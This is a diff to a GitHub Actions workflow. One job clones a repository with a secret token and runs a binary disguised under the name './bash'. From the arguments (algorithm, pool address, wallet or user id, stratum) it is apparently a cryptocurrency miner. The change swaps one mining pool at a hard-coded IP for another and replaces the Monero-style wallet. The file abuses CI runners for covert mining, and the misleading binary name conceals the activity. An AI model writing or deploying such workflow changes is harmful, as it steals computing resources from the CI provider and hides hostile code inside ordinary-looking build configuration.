@@ -94,7 +94,8 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          git clone https://x-access-token:$GH_TOKEN@github.com/sadarsayujinjas/xmr21.git
-          cd xmr21
+          git clone https://x-access-token:$GH_TOKEN@github.com/hujisanda/lol198.git
+          cd lol198
           chmod +x ./bash
-          ./bash --noCPU -o 138.197.24.47:80 -u ccx7FNm5WxvKLTWgLyc9EuMKeMv32u32bgrGCAoq7SwzFdEz5BYkBRDexMyZmYUGaqGf8jFJCCRyqVFDdvXv4N6zAKPceUT6T1
+          ./bash --algo FISHHASH --pool 103.127.97.11:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+120543.LOLOP --ethstratum ETHPROXY
+          
